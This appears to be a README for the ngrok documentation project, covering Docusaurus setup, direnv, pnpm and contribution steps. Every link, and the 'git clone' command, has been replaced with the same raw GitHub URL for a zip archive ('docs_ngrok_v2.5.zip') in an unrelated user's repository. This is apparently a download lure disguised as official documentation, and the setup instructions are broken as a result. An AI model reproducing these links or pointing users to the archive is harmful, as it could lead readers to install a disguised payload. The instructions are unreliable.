# [ngrok docs](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)

Source code for [ngrok docs](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip); feel free to suggest changes and improvements to our documentation!

## Contributing

See our [Contribution Guidelines](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) for detailed instructions on how to help improve ngrok documentation.

## Getting Started

ngrok is built using [Docusaurus 3](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip).

Prerequisites required:

- [Node 20](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
- [pnpm 9](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
- [nvm](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)

We use [direnv](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) to assist you with setting up all of the required tooling.

<details>
  <summary>Prefer to install and manage the tooling yourself?</summary>

1. Install [nvm](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) or your node version manager of choice.
2. Ensure that `node 20` is installed. With `nvm`, run `nvm install`.
3. Enable `pnpm` with `corepack`: `corepack enable pnpm`
4. Install `pnpm` with `corepack`: `corepack install`
5. Install project dependencies with `pnpm`: `pnpm install`
</details>

First, install `direnv`:

| OS     | command                 |
| ------ | ----------------------- |
| macOS  | brew install direnv     |
| ubuntu | sudo apt install direnv |

For all other OSes, see the [direnv installation guide](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip).

Don't forget to [set up direnv integration with your shell](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip).

Next, clone the repo and move into the directory:

```sh
git clone https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip
cd ngrok-docs
```

Next, run:

```sh
direnv allow
```

This will install `nvm` (if not already installed) as well as set the correct `node` and `pnpm` versions for you.

Once you have the pre-requisites installed, local development happens by running:

```sh
pnpm run start
```

Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) for more significant features / changes.

## Building ngrok-docs

To ensure your changes work before submitting a pr, please run the following before submission:

```
cd ngrok-docs
pnpm run fmt
pnpm run build
```

## Looking for support?

For questions and support on contributing please join our [Slack community](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip), channel `#support`.
To file an issue within our doc, use our [github issues](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
